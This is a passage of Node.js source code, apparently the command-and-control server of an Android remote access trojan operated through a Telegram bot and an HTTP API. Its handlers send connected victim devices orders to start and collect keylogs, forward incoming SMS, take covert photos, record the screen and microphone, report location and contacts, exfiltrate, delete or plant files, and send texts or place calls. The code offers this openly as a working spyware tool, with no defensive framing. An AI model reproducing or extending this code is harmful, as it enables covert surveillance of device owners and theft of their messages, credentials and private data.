        safeSendMessage(chatId, '❌ Usage: `/keylogger start|stop`', { parse_mode: 'Markdown', ...getMainKeyboard() });
    }
});

bot.onText(/\/keylogget/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getKeylogs', {}, target);
});

bot.onText(/\/keylogclear/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'clearKeylogs', {}, target);
});

// ========== SMS FORWARD COMMANDS ==========
bot.onText(/\/forward (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const command = match[1].toLowerCase();
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    
    if (command === 'on') {
        sendCommandToDevice(chatId, 'enableSMSForward', {}, target);
        // Update local state too
        if (target !== 'all') {
            const info = appData.get(target) || {};
            appData.set(target, { ...info, smsForwarding: true });
        }
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'disableSMSForward', {}, target);
        if (target !== 'all') {
            const info = appData.get(target) || {};
            appData.set(target, { ...info, smsForwarding: false });
        }
    } else {
        safeSendMessage(chatId, '❌ Usage: `/forward on|off`', { parse_mode: 'Markdown', ...getMainKeyboard() });
    }
});

// ========== MISC COMMANDS ==========
bot.onText(/\/vibrate (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const duration = parseInt(match[1]) || 500;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'vibrate', { duration }, target);
});

bot.onText(/\/wallpaper (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'setWallpaper', { path: match[1].trim() }, target);
});

bot.onText(/\/clearnotif/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'clearNotifications', {}, target);
});

// ========== BUTTON HANDLERS ==========
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    if (!msg.text || msg.text.startsWith('/')) return;

    const text = msg.text;
    const session = getSession(chatId);
    
    // Handle Back button universally
    if (text === '🔙 Back to Main') {
        clearSession(chatId);
        safeSendMessage(chatId, '🔙 Returning to main menu', getMainKeyboard());
        return;
    }
    
    // Handle device selection from device list
    if (text.startsWith('🟢 ') || text.startsWith('🟡 ')) {
        const deviceId = text.substring(2).trim();
        if (connectedDevices.size > 0 && Array.from(connectedDevices.values()).includes(deviceId)) {
            setSession(chatId, 'target_set', { target: deviceId });
            safeSendMessage(chatId, `🎯 Target set to: \`${deviceId}\`\n📢 All commands will now target this device.`, { parse_mode: 'Markdown', ...getMainKeyboard() });
        } else {
            safeSendMessage(chatId, `❌ Device \`${deviceId}\` not found or disconnected.`, { parse_mode: 'Markdown', ...getMainKeyboard() });
        }
        return;
    }
    
    // Handle session-based inputs
    if (session) {
        if (session.state === 'awaiting_sms') {
            const parts = text.split('|');
            if (parts.length >= 2) {
                const target = parts[0].trim();
                const message = parts.slice(1).join('|').trim();
                const deviceTarget = session.data?.target || 'all';
                sendCommandToDevice(chatId, 'sendSms', { target, message }, deviceTarget);
            } else {
                safeSendMessage(chatId, '❌ Invalid format. Use: `+1234567890|Your message`', { parse_mode: 'Markdown', ...getBackButton() });
                return;
            }
            clearSession(chatId);
            return;
        }
        
        if (session.state === 'awaiting_call') {
            const deviceTarget = session.data?.target || 'all';
            sendCommandToDevice(chatId, 'makeCall', { target: text.trim() }, deviceTarget);
            clearSession(chatId);
            return;
        }
        
        if (session.state === 'awaiting_file_path') {
            const deviceTarget = session.data?.target || 'all';
            const action = session.data?.action;
            if (action === 'list') sendCommandToDevice(chatId, 'listFiles', { path: text.trim() }, deviceTarget);
            else if (action === 'delete') sendCommandToDevice(chatId, 'deleteFile', { path: text.trim() }, deviceTarget);
            else if (action === 'info') sendCommandToDevice(chatId, 'getFileInfo', { path: text.trim() }, deviceTarget);
            else if (action === 'download') sendCommandToDevice(chatId, 'downloadFile', { path: text.trim() }, deviceTarget);
            else if (action === 'mkdir') sendCommandToDevice(chatId, 'createFolder', { path: text.trim() }, deviceTarget);
            clearSession(chatId);
            return;
        }
        
        if (session.state === 'awaiting_clipboard_set') {
            const deviceTarget = session.data?.target || 'all';
            sendCommandToDevice(chatId, 'setClipboard', { text: text.trim() }, deviceTarget);
            clearSession(chatId);
            return;
        }
        
        if (session.state === 'awaiting_kill_app') {
            const deviceTarget = session.data?.target || 'all';
            sendCommandToDevice(chatId, 'killApp', { package: text.trim() }, deviceTarget);
            clearSession(chatId);
            return;
        }
        
        if (session.state === 'awaiting_custom_duration') {
            const seconds = parseInt(text);
            if (isNaN(seconds) || seconds <= 0) {
                safeSendMessage(chatId, '❌ Please enter a valid number of seconds.', getBackButton());
                return;
            }
                    if (seconds > 600) {
            safeSendMessage(chatId, '❌ Max duration is 600 seconds (10 minutes).', getBackButton());
            return;
        }
            
            const deviceTarget = session.data?.target || 'all';
            const type = session.data?.type;
            if (type === 'mic') sendCommandToDevice(chatId, 'recordAudio', { duration: seconds * 1000 }, deviceTarget);
            else if (type === 'screen') sendCommandToDevice(chatId, 'screenRecord', { duration: seconds * 1000 }, deviceTarget);
            clearSession(chatId);
            return;
        }
    }
    
    // Menu navigation buttons
    if (text === '📱 Devices') {
        safeSendMessage(chatId, `📱 *Select a device to target:*`, { parse_mode: 'Markdown', ...getDeviceKeyboard() });
        return;
    }
    
    if (text === '📊 Status') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'getDeviceInfo', {}, target);
        return;
    }
    
    if (text === '📷 Camera') {
        safeSendMessage(chatId, `📷 *Select camera:*`, { parse_mode: 'Markdown', ...getCameraKeyboard() });
        return;
    }
    
    if (text === '🎥 Video') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'takeVideo', {}, target);
        return;
    }
    
    if (text === '📸 Screenshot') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'takeScreenshot', {}, target);
        return;
    }
    
    if (text === '🎬 Screen Record') {
        safeSendMessage(chatId, `🎬 *Select recording duration:*`, { parse_mode: 'Markdown', ...getScreenRecordKeyboard() });
        return;
    }
    
    if (text === '🎤 Mic') {
        safeSendMessage(chatId, `🎤 *Select recording duration:*`, { parse_mode: 'Markdown', ...getMicKeyboard() });
        return;
    }
    
    if (text === '🔊 Volume') {
        safeSendMessage(chatId, `🔊 *Volume Control:*`, { parse_mode: 'Markdown', ...getVolumeKeyboard() });
        return;
    }
    
    if (text === '📁 File Manager') {
        safeSendMessage(chatId, `📁 *File Manager:*`, { parse_mode: 'Markdown', ...getFileManagerKeyboard() });
        return;
    }
    
    if (text === '📍 Location') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'getLocation', {}, target);
        return;
    }
    
    if (text === '👥 Contacts') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'getContacts', {}, target);
        return;
    }
    
    if (text === '📨 SMS') {
        setSession(chatId, 'awaiting_sms', { target: session?.data?.target || 'all' });
        safeSendMessage(chatId,
            `📨 *Send SMS*\n\nEnter in format:\n\`+1234567890|Your message\``,
            { parse_mode: 'Markdown', ...getBackButton() }
        );
        return;
    }
    
    if (text === '📞 Call') {
        setSession(chatId, 'awaiting_call', { target: session?.data?.target || 'all' });
        safeSendMessage(chatId,
            `📞 *Make Call*\n\nEnter phone number:\n\`+1234567890\``,
            { parse_mode: 'Markdown', ...getBackButton() }
        );
        return;
    }
    
    if (text === '📋 Clipboard') {
        safeSendMessage(chatId, `📋 *Clipboard Control:*`, { parse_mode: 'Markdown', ...getClipboardKeyboard() });
        return;
    }
    
    if (text === '🔦 Flashlight') {
        safeSendMessage(chatId, `🔦 *Flashlight Control:*`, { parse_mode: 'Markdown', ...getFlashlightKeyboard() });
        return;
    }
    
    if (text === '📶 WiFi') {
        safeSendMessage(chatId, `📶 *WiFi Control:*`, { parse_mode: 'Markdown', ...getWiFiKeyboard() });
        return;
    }
    
    if (text === '📡 Bluetooth') {
        safeSendMessage(chatId, `📡 *Bluetooth Control:*`, { parse_mode: 'Markdown', ...getBluetoothKeyboard() });
        return;
    }
    
    if (text === '✈️ System') {
        safeSendMessage(chatId, `✈️ *System Control:*`, { parse_mode: 'Markdown', ...getSystemKeyboard() });
        return;
    }
    
    if (text === '🔐 Keylogger') {
        safeSendMessage(chatId, `🔐 *Keylogger Control:*`, { parse_mode: 'Markdown', ...getKeyloggerKeyboard() });
        return;
    }
    
    if (text === '⚙️ Settings') {
        safeSendMessage(chatId, `⚙️ *Settings:*`, { parse_mode: 'Markdown', ...getSettingsKeyboard() });
        return;
    }
    
    if (text === '🔄 Reboot') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'reboot', {}, target);
        return;
    }
    
    if (text === '💀 Kill App') {
        setSession(chatId, 'awaiting_kill_app', { target: session?.data?.target || 'all' });
        safeSendMessage(chatId,
            `💀 *Kill App*\n\nEnter package name:\n\`com.example.app\``,
            { parse_mode: 'Markdown', ...getBackButton() }
        );
        return;
    }
    
    if (text === '📱 Remote Control') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'getFullDeviceInfo', {}, target);
        return;
    }
    
    // Sub-menu button commands
    if (text === '📷 Front Camera') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'takePhotoFront', {}, target);
        return;
    }
    
    if (text === '📷 Back Camera') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'takePhoto', { camera: 'back' }, target);
        return;
    }
    
    // Screen record durations
    const screenRecordMap = {
        '🎬 15 sec': 15, '🎬 30 sec': 30, '🎬 1 min': 60,
        '🎬 2 min': 120, '🎬 5 min': 300
    };
    if (screenRecordMap[text]) {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'screenRecord', { duration: screenRecordMap[text] * 1000 }, target);
        return;
    }
    
    if (text === '🎬 Custom') {
        setSession(chatId, 'awaiting_custom_duration', { type: 'screen', target: session?.data?.target || 'all' });
        safeSendMessage(chatId, `🎬 *Custom Screen Record*\n\nEnter duration in seconds:`, { parse_mode: 'Markdown', ...getBackButton() });
        return;
    }
    
    // Mic durations
    const micMap = {
        '🎤 5 sec': 5, '🎤 15 sec': 15, '🎤 30 sec': 30,
        '🎤 1 min': 60, '🎤 5 min': 300
    };
    if (micMap[text]) {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'recordAudio', { duration: micMap[text] * 1000 }, target);
        return;
    }
    
    if (text === '🎤 Custom') {
        setSession(chatId, 'awaiting_custom_duration', { type: 'mic', target: session?.data?.target || 'all' });
        safeSendMessage(chatId, `🎤 *Custom Audio Record*\n\nEnter duration in seconds:`, { parse_mode: 'Markdown', ...getBackButton() });
        return;
    }
    
    // Volume buttons
    if (text === '🔊 Volume Up') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'volumeUp', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '🔉 Volume Down') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'volumeDown', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '🔇 Mute') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'mute', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '🔊 Unmute') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'unmute', {}, session?.data?.target || 'all');
        return;
    }
    
    // Flashlight
    if (text === '🔦 Turn On') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'flashlightOn', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '🔦 Turn Off') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'flashlightOff', {}, session?.data?.target || 'all');
        return;
    }
    
    // WiFi
    if (text === '📶 WiFi On') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'wifiOn', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📶 WiFi Off') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'wifiOff', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📶 WiFi Networks') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getWifiNetworks', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📶 WiFi Info') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getNetworkInfo', {}, session?.data?.target || 'all');
        return;
    }
    
    // Bluetooth
    if (text === '📡 BT On') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'bluetoothOn', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📡 BT Off') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'bluetoothOff', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📡 BT Devices') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getBluetoothDevices', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📡 BT Info') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getBluetoothInfo', {}, session?.data?.target || 'all');
        return;
    }
    
    // System menu
    if (text === '✈️ Airplane Mode') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'airplaneMode', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '🌙 DND') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'doNotDisturb', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📳 Vibrate') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'vibrate', { duration: 500 }, session?.data?.target || 'all');
        return;
    }
    if (text === '🔒 Lock Screen') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'lockScreen', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '🧹 Clear Cache') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'clearCache', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '⚙️ System Info') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getSystemInfo', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📱 Running Apps') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'listRunningApps', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '💾 Storage') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getStorageStats', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '🔋 Battery') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getBatteryInfo', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📶 Network') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getNetworkInfo', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📱 SIM Info') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getSimInfo', {}, session?.data?.target || 'all');
        return;
    }
    
    // Keylogger
    if (text === '▶️ Start Keylogger') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'startKeylogger', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '⏹️ Stop Keylogger') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'stopKeylogger', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📊 Get Keylogs') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getKeylogs', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '🗑️ Clear Keylogs') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'clearKeylogs', {}, session?.data?.target || 'all');
        return;
    }
    
    // File Manager
    if (text === '📂 List Files') {
        setSession(chatId, 'awaiting_file_path', { action: 'list', target: session?.data?.target || 'all' });
        safeSendMessage(chatId, `📂 *List Files*\n\nEnter path:\n\`/sdcard/\``, { parse_mode: 'Markdown', ...getBackButton() });
        return;
    }
    if (text === '📄 File Info') {
        setSession(chatId, 'awaiting_file_path', { action: 'info', target: session?.data?.target || 'all' });
        safeSendMessage(chatId, `📄 *File Info*\n\nEnter file path:`, { parse_mode: 'Markdown', ...getBackButton() });
        return;
    }
    if (text === '⬇️ Download File') {
        setSession(chatId, 'awaiting_file_path', { action: 'download', target: session?.data?.target || 'all' });
        safeSendMessage(chatId, `⬇️ *Download File*\n\nEnter file path:`, { parse_mode: 'Markdown', ...getBackButton() });
        return;
    }
    if (text === '🗑️ Delete File') {
        setSession(chatId, 'awaiting_file_path', { action: 'delete', target: session?.data?.target || 'all' });
        safeSendMessage(chatId, `🗑️ *Delete File*\n\nEnter file path:`, { parse_mode: 'Markdown', ...getBackButton() });
        return;
    }
    if (text === '📁 Create Folder') {
        setSession(chatId, 'awaiting_file_path', { action: 'mkdir', target: session?.data?.target || 'all' });
        safeSendMessage(chatId, `📁 *Create Folder*\n\nEnter folder path:`, { parse_mode: 'Markdown', ...getBackButton() });
        return;
    }
    if (text === '📤 Upload File') {
        safeSendMessage(chatId, `📤 *Upload File*\n\nSend me a file/document and I will upload it to the target device.`, getBackButton());
        return;
    }
    
    // Clipboard
    if (text === '📋 Get Clipboard') {
        const session = getSession(chatId);
        sendCommandToDevice(chatId, 'getClipboard', {}, session?.data?.target || 'all');
        return;
    }
    if (text === '📋 Set Clipboard') {
        setSession(chatId, 'awaiting_clipboard_set', { target: session?.data?.target || 'all' });
        safeSendMessage(chatId, `📋 *Set Clipboard*\n\nEnter text to copy:`, { parse_mode: 'Markdown', ...getBackButton() });
        return;
    }
    
    // Settings
    if (text === '📨 SMS Forward On') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'enableSMSForward', {}, target);
        if (target !== 'all') {
            const info = appData.get(target) || {};
            appData.set(target, { ...info, smsForwarding: true });
        }
        safeSendMessage(chatId, `📨 SMS Forwarding enabled for ${target === 'all' ? 'ALL devices' : target}`, getMainKeyboard());
        return;
    }
    if (text === '📨 SMS Forward Off') {
        const session = getSession(chatId);
        const target = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'disableSMSForward', {}, target);
        if (target !== 'all') {
            const info = appData.get(target) || {};
            appData.set(target, { ...info, smsForwarding: false });
        }
        safeSendMessage(chatId, `📨 SMS Forwarding disabled for ${target === 'all' ? 'ALL devices' : target}`, getMainKeyboard());
        return;
    }
    if (text === '🎯 Select Target Device') {
        safeSendMessage(chatId, `🎯 *Select Target Device:*`, { parse_mode: 'Markdown', ...getDeviceKeyboard() });
        return;
    }
    if (text === '📢 Broadcast Mode') {
        clearSession(chatId);
        safeSendMessage(chatId, `📢 Broadcast mode enabled. All commands will target ALL devices.`, getMainKeyboard());
        return;
    }
    if (text === '🗑️ Clear History') {
        commandHistory.length = 0;
        commandQueue.clear();
        safeSendMessage(chatId, `🗑️ Command history and queue cleared.`, getMainKeyboard());
        return;
    }
    if (text === '📊 Command Stats') {
        const pending = Array.from(commandQueue.values()).filter(c => c.status === 'pending').length;
        const completed = commandHistory.filter(c => c.status === 'completed').length;
        const expired = commandHistory.filter(c => c.status === 'expired').length;
        safeSendMessage(chatId, 
            `📊 *Stats*\n⏳ Pending: ${pending}\n✅ Completed: ${completed}\n⏰ Expired: ${expired}\n📜 Total: ${commandHistory.length}`,
            { parse_mode: 'Markdown', ...getMainKeyboard() }
        );
        return;
    }
    
    // Unknown command
    safeSendMessage(chatId, `❌ Unknown command: ${text}\nUse buttons or /help`, getMainKeyboard());
});

// ========== FILE UPLOAD FROM TELEGRAM ==========
bot.on('document', (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    
    bot.getFileLink(msg.document.file_id).then(link => {
        safeSendMessage(chatId, `📤 Uploading \`${msg.document.file_name}\` to ${target}...`, { parse_mode: 'Markdown' });
        sendCommandToDevice(chatId, 'uploadFile', { 
            url: link, 
            filename: msg.document.file_name,
            size: msg.document.file_size
        }, target);
    }).catch(err => {
        safeSendMessage(chatId, `❌ Failed to get file: ${err.message}`, getMainKeyboard());
    });
});

// ========== WEB ENDPOINTS ==========
function checkAdminAuth(req, res, next) {
    const auth = req.headers.authorization;
    if (!auth || auth !== `Bearer ${ADMIN_PASSWORD}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
}

app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        devices: connectedDevices.size,
        uniqueDevices: appData.size,
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

app.get('/devices', checkAdminAuth, (req, res) => {
    const deviceList = [];
    for (let [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        deviceList.push({
            id: deviceId,
            platform: info.platform || 'unknown',
            connectedAt: info.connectedAt,
            lastHeartbeat: info.lastHeartbeat,
            smsForwarding: info.smsForwarding || false,
            battery: info.battery,
            network: info.network,
            ip: info.ip,
            online: info.lastHeartbeat ? (Date.now() - new Date(info.lastHeartbeat).getTime() < HEARTBEAT_TIMEOUT) : false
        });
    }
    res.json(deviceList);
});

app.get('/history', checkAdminAuth, (req, res) => {
    res.json({
        queue: Array.from(commandQueue.entries()),
        history: commandHistory.slice(0, 100)
    });
});

app.post('/command', checkAdminAuth, express.json(), (req, res) => {
    const { command, extras, target } = req.body;
    if (!command) return res.status(400).json({ error: 'Command required' });
    
    const requestId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const payload = {
        request: command,
        extras: extras || {},
        requestId,
        from: 'api',
        timestamp: Date.now()
    };
    
    commandQueue.set(requestId, {
        chatId: 'api',
        command,
        timestamp: Date.now(),
        target: target || 'all',
        status: 'pending'
    });
    
    let sent = false;
    if (target && target !== 'all') {
        sent = broadcastToDevice(target, 'message', payload);
    } else {
        broadcastToAll('message', payload);
        sent = connectedDevices.size > 0;
    }
    
    res.json({ success: sent, requestId, target: target || 'all' });
});

app.post('/upload', checkAdminAuth, upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
    res.json({ 
        success: true, 
        filename: req.file.filename,
        path: req.file.path,
        size: req.file.size
    });
});

app.get('/download/:filename', checkAdminAuth, (req, res) => {
    const filePath = path.join(uploadDir, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found' });
    res.download(filePath);
});

// ========== CLEANUP & MONITORING ==========
setInterval(() => {
    cleanupOldCommands();
    
    // Check for stale devices
    const now = Date.now();
    for (const [deviceId, info] of appData) {
        if (info.lastHeartbeat) {
            const lastHb = new Date(info.lastHeartbeat).getTime();
            if (now - lastHb > HEARTBEAT_TIMEOUT && socketMap.has(deviceId)) {
                const socketId = socketMap.get(deviceId);
                const socket = io.sockets.sockets.get(socketId);
                if (!socket || !socket.connected) {
                    socketMap.delete(deviceId);
                    console.log(`🧹 Cleaned up stale device: ${deviceId}`);
                }
            }
        }
    }
}, 60000);

setInterval(() => {
    const now = new Date().toISOString();
    console.log(`💓 Keep-alive | Devices: ${connectedDevices.size} | Memory: ${formatSize(process.memoryUsage().heapUsed)} | ${now}`);
}, 60000);

// ========== START SERVER ==========
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Connected devices: ${connectedDevices.size}`);
    console.log(`🤖 Bot is ready!`);
    console.log(`🔑 Admin password: ${ADMIN_PASSWORD}`);
    console.log(`📊 Status: http://0.0.0.0:${PORT}/status`);
});

// ========== GRACEFUL SHUTDOWN ==========
process.on('SIGINT', () => {
    console.log('🛑 Shutting down gracefully...');
    bot.stopPolling();
    io.close(() => {
        server.close(() => {
            console.log('👋 Server closed');
            process.exit(0);
        });
    });
});

process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM received...');
    bot.stopPolling();
    io.close(() => {
        server.close(() => {
            process.exit(0);
        });
    });
});

process.on('uncaughtException', (err) => {
    console.error('💥 Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('💥 Unhandled Rejection at:', promise, 'reason:', reason);
});